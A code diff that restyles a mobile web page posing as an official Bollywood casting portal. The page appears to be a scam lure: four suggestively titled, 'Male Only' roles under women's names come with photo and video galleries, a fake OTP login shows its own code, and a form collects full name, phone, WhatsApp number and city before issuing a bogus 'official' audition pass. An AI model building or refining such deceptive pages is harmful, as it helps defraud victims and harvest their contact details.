@@ -6,18 +6,19 @@
   <title>CineStar Casting Network - Official</title>
   <style>
     :root {
-      --bg-dark: #0f1015;
-      --card-bg: #181a22;
+      --bg-dark: #0a0b0e;
+      --card-bg: #14161f;
+      --card-inner: #0f1017;
       --gold: #d4af37;
       --gold-light: #f3e5ab;
-      --red: #e50914;
+      --gold-dark: #997a15;
       --text-white: #ffffff;
-      --text-muted: #8b8f9f;
-      --border: #282b36;
+      --text-muted: #8c90a2;
+      --border: #232736;
       --green: #2ecc71;
     }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
     html, body {
       background-color: var(--bg-dark);
       color: var(--text-white);
@@ -29,16 +30,16 @@
       width: 100% !important;
       max-width: 480px !important;
       margin: 0 auto !important;
-      display: block !important;
       min-height: 100vh;
       background-color: var(--bg-dark);
       position: relative;
-      padding-bottom: 75px;
+      padding-bottom: 80px;
     }
 
-    /* Top Header */
+    /* Top Sticky Header */
     .top-header {
-      background: rgba(15, 16, 21, 0.95);
+      background: rgba(10, 11, 14, 0.96);
+      backdrop-filter: blur(10px);
       border-bottom: 1px solid var(--border);
       padding: 12px 16px;
       display: flex;
@@ -46,15 +47,37 @@
       align-items: center;
       position: sticky;
       top: 0;
-      z-index: 100;
+      z-index: 200;
     }
     .brand-box { display: flex; align-items: center; gap: 10px; }
-    .brand-logo { width: 34px; height: 34px; background: var(--gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #000; font-weight: 900; }
-    .brand-name { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: 0.5px; }
-    .brand-sub { font-size: 10px; color: var(--gold); }
-    .user-pill { background: #202430; border: 1px solid var(--border); border-radius: 20px; padding: 4px 10px; font-size: 11px; color: var(--gold-light); display: flex; align-items: center; gap: 5px; }
+    .brand-logo {
+      width: 34px;
+      height: 34px;
+      background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #000;
+      font-weight: 900;
+      font-size: 18px;
+    }
+    .brand-name { font-size: 15px; font-weight: 800; color: #fff; letter-spacing: 0.5px; }
+    .brand-sub { font-size: 9.5px; color: var(--gold); font-weight: 600; letter-spacing: 0.5px; }
+    .user-pill {
+      background: #191c28;
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 5px 12px;
+      font-size: 11px;
+      color: var(--gold-light);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .status-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; box-shadow: 0 0 6px var(--green); }
 
-    /* Screen Management */
+    /* Screen System */
     .screen {
       display: none !important;
       width: 100% !important;
@@ -63,122 +86,135 @@
     }
     .screen.active {
       display: block !important;
-      width: 100% !important;
     }
 
-    /* Auth Screen */
+    /* Auth Screen 1 */
     .auth-card {
       background: var(--card-bg);
       border: 1px solid var(--border);
-      border-radius: 14px;
+      border-radius: 16px;
       padding: 24px 18px;
       margin-top: 15px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
     }
     .auth-card h2 { font-size: 19px; color: #fff; margin-bottom: 6px; font-weight: 700; text-align: center; }
-    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; text-align: center; line-height: 1.4; }
+    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; text-align: center; line-height: 1.45; }
 
-    .input-grp { margin-bottom: 14px; text-align: left; }
-    .input-grp label { display: block; font-size: 11px; font-weight: 600; color: var(--text-muted); margin-bottom: 5px; letter-spacing: 0.5px; }
+    .input-grp { margin-bottom: 15px; text-align: left; }
+    .input-grp label { display: block; font-size: 11px; font-weight: 700; color: var(--text-muted); margin-bottom: 6px; letter-spacing: 0.5px; }
     .input-grp input {
       width: 100%;
-      background: #0f1015;
+      background: var(--card-inner);
       border: 1px solid var(--border);
       color: #fff;
-      padding: 11px 12px;
+      padding: 12px 14px;
       border-radius: 8px;
       font-size: 14px;
       outline: none;
+      transition: border-color 0.2s;
     }
     .input-grp input:focus { border-color: var(--gold); }
 
     .btn-main {
       width: 100%;
-      padding: 13px;
-      background: var(--gold);
+      padding: 14px;
+      background: linear-gradient(135deg, var(--gold), #b89120);
       color: #000;
       border: none;
       border-radius: 8px;
-      font-weight: 700;
-      font-size: 14px;
+      font-weight: 800;
+      font-size: 13.5px;
       cursor: pointer;
       text-transform: uppercase;
       letter-spacing: 0.5px;
+      box-shadow: 0 4px 15px rgba(212,175,55,0.25);
     }
 
-    /* Casting Cards */
+    /* Casting Role Cards */
     .casting-card {
       background: var(--card-bg);
       border: 1px solid var(--border);
-      border-radius: 14px;
+      border-radius: 16px;
       overflow: hidden;
-      margin-bottom: 20px !important;
-      width: 100% !important;
-      display: block !important;
-      box-sizing: border-box !important;
+      margin-bottom: 22px !important;
       position: relative;
     }
-    .card-img-wrap { position: relative; width: 100%; height: 320px; overflow: hidden; background: #161822; }
+    .card-img-wrap { position: relative; width: 100%; height: 340px; overflow: hidden; background: #12141c; }
     .card-img-wrap img { width: 100%; height: 100%; object-fit: cover; display: block; }
     .card-badge {
       position: absolute;
       top: 12px;
       left: 12px;
-      background: rgba(0,0,0,0.8);
+      background: rgba(0,0,0,0.85);
       border: 1px solid var(--gold);
       color: var(--gold);
       padding: 5px 12px;
       border-radius: 20px;
-      font-size: 11px;
-      font-weight: 700;
+      font-size: 10.5px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
       z-index: 5;
     }
-    .card-body { padding: 14px; }
-    .card-title { font-size: 16px; font-weight: 700; color: #fff; margin-bottom: 4px; }
-    .card-starring { font-size: 12px; color: var(--gold-light); margin-bottom: 12px; }
+    .card-body { padding: 16px; }
+    .card-title { font-size: 16.5px; font-weight: 800; color: #fff; margin-bottom: 4px; }
+    .card-starring { font-size: 12.5px; color: var(--gold-light); margin-bottom: 12px; }
 
     .meta-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
       gap: 8px;
-      background: #12131a;
-      padding: 10px;
-      border-radius: 8px;
-      margin-bottom: 12px;
-      border: 1px solid #222530;
+      background: var(--card-inner);
+      padding: 10px 12px;
+      border-radius: 10px;
+      margin-bottom: 14px;
+      border: 1px solid var(--border);
     }
-    .meta-item { font-size: 11px; }
-    .meta-item span { display: block; color: var(--text-muted); font-size: 10px; margin-bottom: 2px; }
-    .meta-item strong { color: #fff; font-size: 12px; }
-    .pkg-val { color: var(--green) !important; font-weight: 800 !important; }
+    .meta-item span { display: block; color: var(--text-muted); font-size: 9.5px; font-weight: 700; margin-bottom: 2px; }
+    .meta-item strong { color: #fff; font-size: 12.5px; }
+    .pkg-val { color: var(--green) !important; font-weight: 900 !important; }
 
-    .btn-watch {
-      width: 100%;
-      background: #202430;
-      color: var(--gold);
-      border: 1px solid var(--gold);
-      padding: 11px;
-      border-radius: 8px;
-      font-size: 12px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-bottom: 8px;
+    /* Prominent Big Preview Button */
+    .preview-btn-row {
       display: flex;
       align-items: center;
-      justify-content: center;
+      justify-content: space-between;
+      gap: 8px;
+      background: #191c28;
+      border: 1px solid var(--gold);
+      border-radius: 10px;
+      padding: 12px 14px;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .preview-hint-txt {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--gold);
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .preview-action-txt {
+      font-size: 12px;
+      font-weight: 800;
+      color: #fff;
+      display: flex;
+      align-items: center;
       gap: 6px;
     }
-    .btn-apply {
+
+    .btn-apply-full {
       width: 100%;
       background: var(--gold);
       color: #000;
       border: none;
-      padding: 11px;
-      border-radius: 8px;
-      font-size: 13px;
-      font-weight: 700;
+      padding: 13px;
+      border-radius: 9px;
+      font-size: 13.5px;
+      font-weight: 800;
       cursor: pointer;
       text-transform: uppercase;
+      letter-spacing: 0.5px;
     }
 
     /* Modal Styling */
@@ -186,21 +222,21 @@
       display: none;
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.92);
+      background: rgba(0,0,0,0.94);
       z-index: 10000;
       justify-content: center;
       align-items: center;
-      padding: 16px;
+      padding: 14px;
     }
     .preview-content {
-      background: #181a22;
+      background: var(--card-bg);
       border: 1px solid var(--gold);
-      border-radius: 12px;
+      border-radius: 14px;
       width: 100%;
       max-width: 440px;
       padding: 16px;
       position: relative;
-      max-height: 88vh;
+      max-height: 90vh;
       overflow-y: auto;
     }
     .preview-close {
@@ -215,25 +251,26 @@
 
     /* Pass Card */
     .pass-card {
-      background: #12131a;
+      background: #10121a;
       border: 1.5px dashed var(--gold);
-      border-radius: 14px;
-      padding: 20px 16px;
+      border-radius: 16px;
+      padding: 22px 16px;
       margin-top: 15px;
       text-align: center;
+      box-shadow: 0 10px 30px rgba(212,175,55,0.12);
     }
-    .pass-id { font-size: 14px; font-weight: 800; color: var(--gold); margin-bottom: 12px; letter-spacing: 1px; }
-    .pass-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1f222e; font-size: 12px; }
+    .pass-id { font-size: 15px; font-weight: 800; color: var(--gold); margin-bottom: 14px; letter-spacing: 1px; }
+    .pass-row { display: flex; justify-content: space-between; padding: 7px 0; border-bottom: 1px solid #1a1e2b; font-size: 12px; }
     .pass-row span { color: var(--text-muted); }
     .pass-row strong { color: #fff; }
 
-    /* Sticky Language Bar */
+    /* Sticky Bottom Language Switcher */
     .lang-bar {
       position: fixed;
       bottom: 0;
       left: 0;
       right: 0;
-      background: rgba(15, 16, 21, 0.98);
+      background: rgba(10, 11, 14, 0.98);
       border-top: 1px solid var(--border);
       padding: 8px 10px;
       display: flex;
@@ -243,11 +280,11 @@
       overflow-x: auto;
     }
     .lang-btn {
-      background: #181a22;
+      background: #161822;
       color: #fff;
-      border: 1px solid #333745;
+      border: 1px solid #2d3142;
       border-radius: 4px;
-      padding: 5px 9px;
+      padding: 6px 10px;
       font-size: 11px;
       cursor: pointer;
       white-space: nowrap;
@@ -255,7 +292,8 @@
     .lang-btn.active {
       border-color: var(--gold);
       color: var(--gold);
-      font-weight: bold;
+      font-weight: 800;
+      background: #202330;
     }
   </style>
 </head>
@@ -273,15 +311,16 @@
       </div>
     </div>
     <div class="user-pill">
-      <span>●</span> <span data-i18n="portal_active">Active Portal</span>
+      <div class="status-dot"></div>
+      <span data-i18n="portal_active">Active Portal</span>
     </div>
   </header>
 
   <!-- SCREEN 1: LOGIN -->
   <section class="screen active" id="screenLogin">
     <div style="text-align:center; padding: 25px 10px 5px;">
-      <div style="width:60px; height:60px; margin:0 auto 12px; background:var(--gold); border-radius:14px; display:flex; align-items:center; justify-content:center; box-shadow:0 8px 20px rgba(212,175,55,0.25);">
-        <span style="font-size:30px; color:#000;">★</span>
+      <div style="width:62px; height:62px; margin:0 auto 12px; background:linear-gradient(135deg, var(--gold), var(--gold-dark)); border-radius:14px; display:flex; align-items:center; justify-content:center; box-shadow:0 8px 20px rgba(212,175,55,0.25);">
+        <span style="font-size:32px; color:#000;">★</span>
       </div>
       <h1 style="font-size:20px; font-weight:800; letter-spacing:1px; margin-bottom:4px;">CINESTAR CASTING</h1>
       <p style="font-size:12px; color:var(--text-muted);" data-i18n="portal_sub">Official Bollywood & Web Series Audition Portal</p>
@@ -297,8 +336,8 @@
       </div>
 
       <div id="boxOtpSection" style="display:none; margin-top:14px;">
-        <div style="background:#202430; border:1px dashed var(--gold); border-radius:8px; padding:10px; margin-bottom:12px; text-align:center; font-size:13px; color:var(--gold);">
-          OTP: <strong id="dispAutoOtp" style="font-size:17px; letter-spacing:4px; font-weight:900;">----</strong>
+        <div style="background:#1c202d; border:1px dashed var(--gold); border-radius:8px; padding:10px; margin-bottom:12px; text-align:center; font-size:13px; color:var(--gold);">
+          OTP: <strong id="dispAutoOtp" style="font-size:18px; letter-spacing:4px; font-weight:900;">----</strong>
         </div>
         <div class="input-grp">
           <label data-i18n="otp_label">ENTER 4-DIGIT CODE</label>
@@ -306,25 +345,25 @@
         </div>
       </div>
 
-      <button type="button" class="btn-main" id="btnAuthAction" onclick="handleAuth()" style="margin-top:10px;" data-i18n="btn_send">SEND CODE</button>
+      <button type="button" class="btn-main" id="btnAuthAction" onclick="handleAuth()" style="margin-top:8px;" data-i18n="btn_send">SEND CODE</button>
     </div>
   </section>
   <!-- SCREEN 2: LOBBY -->
   <section class="screen" id="screenLobby">
 
     <!-- Hero Announcement -->
-    <div style="background: linear-gradient(135deg, #3d1418, #181a22); border:1px solid #752026; border-radius:12px; padding:14px; margin-bottom:16px; text-align:center;">
-      <div style="font-size:11px; color:#ff9999; font-weight:700;" data-i18n="vip_badge">VIP ARTIST ENROLLMENT 2026-2027</div>
-      <div style="font-size:15px; font-weight:800; color:#fff; margin:4px 0;" data-i18n="vip_title">New Major Film & OTT Castings Open</div>
-      <div style="font-size:11px; color:#ddd;" data-i18n="vip_desc">Direct shortlisting for freshers & experienced male/female actors.</div>
+    <div style="background: linear-gradient(135deg, #3d1418, #181a22); border: 1px solid #752026; border-radius: 14px; padding: 14px; margin-bottom: 16px; text-align: center;">
+      <div style="font-size: 11px; color: #ff9999; font-weight: 800; letter-spacing: 0.5px;" data-i18n="vip_badge">VIP ARTIST ENROLLMENT 2026-2027</div>
+      <div style="font-size: 15.5px; font-weight: 800; color: #fff; margin: 4px 0;" data-i18n="vip_title">New Major Film & OTT Castings Open</div>
+      <div style="font-size: 11.5px; color: #ddd;" data-i18n="vip_desc">Direct shortlisting for freshers & experienced male/female actors.</div>
     </div>
 
-    <div style="font-size:13px; font-weight:700; color:var(--gold); margin-bottom:12px; display:flex; justify-content:space-between;">
+    <div style="font-size: 13.5px; font-weight: 800; color: var(--gold); margin-bottom: 12px; display: flex; justify-content: space-between;">
       <span data-i18n="live_heading">Active Casting Calls</span>
-      <span style="font-size:11px; color:var(--text-muted);" data-i18n="live_count">4 Roles Live</span>
+      <span style="font-size: 11px; color: var(--text-muted);" data-i18n="live_count">4 Roles Live</span>
     </div>
 
-    <!-- Profile 1: Srimoyee -->
+    <!-- Profile 1: Srimoyee (IMG_3930 to 3937 + Exact Uploaded Videos) -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_vip">VIP Casting</span>
@@ -339,14 +378,18 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur3">3 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Srimoyee', 3930, 3937, 'srimoyee.mp4')">
-          🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
-        </button>
-        <button type="button" class="btn-apply" onclick="openRegisterModal('Velvet Secrets (Srimoyee)', '₹45,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+
+        <!-- Prominent Big Preview Button -->
+        <div class="preview-btn-row" onclick="openModelGallery('Srimoyee', 3930, 3937, ['b10919b3b2e6474f88e706c3e1c0a002.mp4', 'fc1a1212333e40fca3b517117202395e.mp4', '528269e5de944c71858851103ea4a55c.mp4', '759be8a585da407b84ee20f455b39c79.mp4', 'b7f72182-5518-4b54-b34d-1b9e4533b646.mp4'])">
+          <span class="preview-hint-txt">Click the button 👉</span>
+          <span class="preview-action-txt">🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span></span>
+        </div>
+
+        <button type="button" class="btn-apply-full" onclick="openRegistrationPage('Velvet Secrets (Srimoyee)', '₹45,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 2: Tejashwini -->
+    <!-- Profile 2: Tejashwini (IMG_3901 to 3924 + Exact Uploaded Videos) -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_new">New Shoot</span>
@@ -361,14 +404,18 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur2">2 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Tejashwini', 3901, 3924, 'tejashwini.mp4')">
-          🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
-        </button>
-        <button type="button" class="btn-apply" onclick="openRegisterModal('Urban Seduction (Tejashwini)', '₹30,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+
+        <!-- Prominent Big Preview Button -->
+        <div class="preview-btn-row" onclick="openModelGallery('Tejashwini', 3901, 3924, ['videocomp_8stqmbnow7.mp4', 'fcd4e66d-40d3-4514-bfed-549c700f5a88.mp4', 'b2b2806d-404b-4d77-9bbc-b4213c36e30f.mp4', 'videocomp_l56d9w4991 (online-video-cutter.com).mp4', 'videocomp_1jofqj74oq.mp4'])">
+          <span class="preview-hint-txt">Click the button 👉</span>
+          <span class="preview-action-txt">🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span></span>
+        </div>
+
+        <button type="button" class="btn-apply-full" onclick="openRegistrationPage('Urban Seduction (Tejashwini)', '₹30,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 3: Tina Nandy -->
+    <!-- Profile 3: Tina Nandy (IMG_3854 to 3900 + Exact Uploaded Videos) -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_mega">Mega Budget</span>
@@ -383,14 +430,18 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur3">3 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Tina Nandy', 3854, 3900, 'tina.mp4')">
-          🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
-        </button>
-        <button type="button" class="btn-apply" onclick="openRegisterModal('Golden Mirage (Tina Nandy)', '₹45,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+
+        <!-- Prominent Big Preview Button -->
+        <div class="preview-btn-row" onclick="openModelGallery('Tina Nandy', 3854, 3900, ['7bcd292e-fc84-433e-b034-cc8af5b297f7.mp4', 'a38517f8-de75-41b7-a97c-1b9c80898b68.mp4', 'e9a6c6f1-904f-4445-835e-a3fee76d5942.mp4', '19235ad0-b949-45ef-b78c-3d9e32ba6ba6.mp4', '17eeb217-5a16-4ddf-b9e7-988e5e4096a1.mp4', '0ed270b3-223d-4fc3-855b-f574fa63ba32.mp4', '396e8f1c-7703-4864-b970-d74fce97030d.mp4'])">
+          <span class="preview-hint-txt">Click the button 👉</span>
+          <span class="preview-action-txt">🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span></span>
+        </div>
+
+        <button type="button" class="btn-apply-full" onclick="openRegistrationPage('Golden Mirage (Tina Nandy)', '₹45,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 4: Anjali -->
+    <!-- Profile 4: Anjali (IMG_3938 to 3978 + Exact Uploaded Videos) -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_comm">Commercial</span>
@@ -405,101 +456,125 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur2">2 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button type="button" class="btn-watch" onclick="openModelGallery('Anjali', 3938, 3978, 'anjali.mp4')">
-          🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
-        </button>
-        <button type="button" class="btn-apply" onclick="openRegisterModal('Desire & Destiny (Anjali)', '₹30,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
+
+        <!-- Prominent Big Preview Button -->
+        <div class="preview-btn-row" onclick="openModelGallery('Anjali', 3938, 3978, ['adbd39a3-54a3-4d12-8baf-6890fcafb152.mp4', '297f412d-cca3-4e16-ab27-a363c152fc70.mp4', '65a08de3-6fce-4cfa-ac11-7d332cff8f2c.mov', 'fb5191f3-83f6-4183-9ee0-998dd37c8930.mp4'])">
+          <span class="preview-hint-txt">Click the button 👉</span>
+          <span class="preview-action-txt">🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span></span>
+        </div>
+
+        <button type="button" class="btn-apply-full" onclick="openRegistrationPage('Desire & Destiny (Anjali)', '₹30,000')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
   </section>
+  <!-- SCREEN 3: DEDICATED FULL REGISTRATION PAGE -->
+  <section class="screen" id="screenRegister">
+    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;">
+      <button type="button" onclick="goToLobby()" style="background: #1c202d; color: var(--gold); border: 1px solid var(--border); border-radius: 8px; padding: 6px 12px; font-size: 12px; cursor: pointer; font-weight: 700;">
+        ❮ Back to Roles
+      </button>
+      <div style="font-size: 11px; color: var(--text-muted);">Step 2 of 2</div>
+    </div>
 
-  <!-- SCREEN 3: SUCCESS AUDITION PASS -->
+    <div style="background: linear-gradient(135deg, #241c10, #14161f); border: 1px solid var(--gold); border-radius: 14px; padding: 14px 16px; margin-bottom: 16px;">
+      <div style="font-size: 11px; color: var(--gold); font-weight: 700; text-transform: uppercase;">Official Role Application</div>
+      <div style="font-size: 16px; font-weight: 800; color: #fff; margin: 3px 0;" id="regPageRoleTitle">Role Name</div>
+      <div style="font-size: 12px; color: var(--green); font-weight: 700;" id="regPageBudget">Package: ₹00,000</div>
+    </div>
+
+    <div class="auth-card" style="margin-top: 0;">
+      <h2 style="font-size: 18px; margin-bottom: 4px; text-align: left;">Candidate Details</h2>
+      <p style="font-size: 11.5px; margin-bottom: 16px; text-align: left;">Please fill in accurate details. An official Audition Pass ID will be generated upon submission.</p>
+
+      <div class="input-grp">
+        <label>FULL CANDIDATE NAME *</label>
+        <input type="text" id="regFullName" placeholder="Enter your full legal name">
+      </div>
+
+      <div class="input-grp">
+        <label>PRIMARY CONTACT NUMBER *</label>
+        <input type="tel" id="regContactNum" placeholder="10-digit mobile number" maxlength="10">
+      </div>
+
+      <div class="input-grp">
+        <label>WHATSAPP NUMBER *</label>
+        <input type="tel" id="regWhatsappNum" placeholder="10-digit WhatsApp number" maxlength="10">
+      </div>
+
+      <div class="input-grp">
+        <label>CURRENT CITY / STATE *</label>
+        <input type="text" id="regCityState" placeholder="e.g. Mumbai, Maharashtra">
+      </div>
+
+      <button type="button" class="btn-main" onclick="submitRegistrationForm()" style="margin-top: 10px;">
+        SUBMIT & ISSUE AUDITION PASS
+      </button>
+    </div>
+  </section>
+
+  <!-- SCREEN 4: SUCCESS AUDITION PASS -->
   <section class="screen" id="screenPass">
-    <div style="text-align:center; padding: 20px 10px 10px;">
-      <div style="width:55px; height:55px; margin:0 auto 10px; background:var(--green); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:26px; color:#fff;">✓</div>
-      <h2 style="font-size:20px; font-weight:800; color:#fff;">Application Registered!</h2>
-      <p style="font-size:12px; color:var(--text-muted); margin-top:4px;">Your Casting Call Pass has been generated successfully.</p>
+    <div style="text-align: center; padding: 20px 10px 10px;">
+      <div style="width: 55px; height: 55px; margin: 0 auto 10px; background: var(--green); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; color: #fff;">✓</div>
+      <h2 style="font-size: 20px; font-weight: 800; color: #fff;">Application Registered!</h2>
+      <p style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">Your Casting Call Pass has been generated successfully.</p>
     </div>
 
     <div class="pass-card">
-      <div style="font-size:11px; color:var(--gold); font-weight:700; letter-spacing:1px; margin-bottom:4px;">OFFICIAL ARTIST AUDITION CARD</div>
+      <div style="font-size: 11px; color: var(--gold); font-weight: 800; letter-spacing: 1px; margin-bottom: 4px;">OFFICIAL ARTIST AUDITION CARD</div>
       <div class="pass-id" id="passCardId">ID: CST-22471</div>
 
       <div class="pass-row"><span>Candidate Name:</span><strong id="passName">--</strong></div>
       <div class="pass-row"><span>Project Applied:</span><strong id="passProject">--</strong></div>
-      <div class="pass-row"><span>Budget Package:</span><strong id="passBudget" style="color:var(--green);">--</strong></div>
+      <div class="pass-row"><span>Budget Package:</span><strong id="passBudget" style="color: var(--green);">--</strong></div>
       <div class="pass-row"><span>Registered Contact:</span><strong id="passContact">--</strong></div>
-      <div class="pass-row"><span>Address:</span><strong id="passAddress">--</strong></div>
-      <div class="pass-row"><span>Status:</span><strong style="color:var(--gold);">Profile Under Review</strong></div>
+      <div class="pass-row"><span>Address / Location:</span><strong id="passAddress">--</strong></div>
+      <div class="pass-row"><span>Status:</span><strong style="color: var(--gold);">Profile Under Review</strong></div>
 
-      <div style="margin: 18px auto 8px; width: 140px; height: 140px; background:#fff; padding:6px; border-radius:8px;">
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=CINESTAR-VERIFIED-ARTIST" alt="Pass QR" style="width:100%; height:100%;">
+      <div style="margin: 18px auto 8px; width: 140px; height: 140px; background: #fff; padding: 6px; border-radius: 8px;">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=CINESTAR-VERIFIED-ARTIST" alt="Pass QR" style="width: 100%; height: 100%;">
       </div>
-      <div style="font-size:10px; color:var(--text-muted);">Scan to Verify Candidate Verification Portal</div>
+      <div style="font-size: 10px; color: var(--text-muted);">Scan to Verify Candidate Verification Portal</div>
     </div>
 
-    <button type="button" class="btn-main" onclick="goToLobby()" style="margin-top:20px;">BROWSE MORE CASTING CALLS</button>
+    <button type="button" class="btn-main" onclick="goToLobby()" style="margin-top: 20px;">BROWSE MORE CASTING CALLS</button>
   </section>
 
 </div>
 
-<!-- REGISTRATION MODAL -->
-<div class="preview-modal" id="registerModal">
-  <div class="preview-content">
-    <span class="preview-close" onclick="closeRegisterModal()">&times;</span>
-    <h3 style="color:var(--gold); font-size:17px; margin-bottom:4px; font-weight:800;">Artist Registration</h3>
-    <p style="font-size:11px; color:var(--text-muted); margin-bottom:14px;" id="regRoleSubtitle">Applying for role</p>
-
-    <div class="input-grp">
-      <label>FULL NAME</label>
-      <input type="text" id="regName" placeholder="Enter your full name">
-    </div>
-    <div class="input-grp">
-      <label>CONTACT NUMBER</label>
-      <input type="tel" id="regPhone" placeholder="Enter contact number" maxlength="10">
-    </div>
-    <div class="input-grp">
-      <label>WHATSAPP NUMBER</label>
-      <input type="tel" id="regWhatsapp" placeholder="Enter WhatsApp number" maxlength="10">
-    </div>
-    <div class="input-grp">
-      <label>ADDRESS (CITY / STATE)</label>
-      <input type="text" id="regAddress" placeholder="e.g. Mumbai, Maharashtra">
-    </div>
-
-    <button type="button" class="btn-main" onclick="submitRegistration()" style="margin-top:8px;">SUBMIT & GENERATE PASS</button>
-  </div>
-</div>
-
-<!-- MEDIA PREVIEW POPUP -->
+<!-- MEDIA PREVIEW POPUP (LARGER PREVIEW MODE) -->
 <div class="preview-modal" id="mediaPreviewModal">
   <div class="preview-content">
     <span class="preview-close" onclick="closeMediaPreview()">&times;</span>
-    <h4 id="previewArtistName" style="color:var(--gold); margin-bottom:8px; font-size:15px;">Audition Clips & Portfolio</h4>
+    <h4 id="previewArtistName" style="color: var(--gold); margin-bottom: 10px; font-size: 15px; font-weight: 800;">Media & Audition Clips</h4>
     
-    <div id="videoContainerBox" style="width:100%; height:230px; background:#000; border-radius:8px; overflow:hidden; margin-bottom:10px;">
-      <video id="previewVideoPlayer" controls playsinline webkit-playsinline style="width:100%; height:100%; object-fit:contain; background:#000;"></video>
+    <!-- Multi-clip Buttons -->
+    <div id="previewVideoTabs" style="display: flex; gap: 6px; justify-content: flex-start; margin-bottom: 10px; overflow-x: auto; padding-bottom: 4px;"></div>
+
+    <!-- Prominent Video Container -->
+    <div id="videoContainerBox" style="width: 100%; height: 260px; background: #000; border-radius: 10px; overflow: hidden; border: 1px solid var(--border);">
+      <video id="previewVideoPlayer" controls playsinline webkit-playsinline style="width: 100%; height: 100%; object-fit: contain; background: #000;"></video>
     </div>
 
-    <div style="font-size:12px; color:var(--gold); margin:10px 0 8px; text-align:left; font-weight:600;" data-i18n="preview_gallery_hint">Portfolio Photos (Tap to slide full screen)</div>
-    <div id="previewGalleryStrip" style="display:flex; gap:8px; overflow-x:auto; padding-bottom:8px;"></div>
+    <div style="font-size: 12px; color: var(--gold); margin: 14px 0 8px; text-align: left; font-weight: 700;" data-i18n="preview_gallery_hint">Portfolio Photos (Tap to slide full screen)</div>
+    <div id="previewGalleryStrip" style="display: flex; gap: 8px; overflow-x: auto; padding-bottom: 8px;"></div>
   </div>
 </div>
 
 <!-- FULL IMAGE SLIDER -->
-<div id="fullImageModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.96); z-index:99999; justify-content:center; align-items:center; flex-direction:column; padding:10px;" onclick="closeFullImage()">
-  <span style="position:absolute; top:18px; right:20px; color:#fff; font-size:32px; cursor:pointer;">&times;</span>
-  <span id="imageCounter" style="position:absolute; top:22px; left:20px; color:#d4af37; font-size:14px; font-weight:600;"></span>
+<div id="fullImageModal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 99999; justify-content: center; align-items: center; flex-direction: column; padding: 10px;" onclick="closeFullImage()">
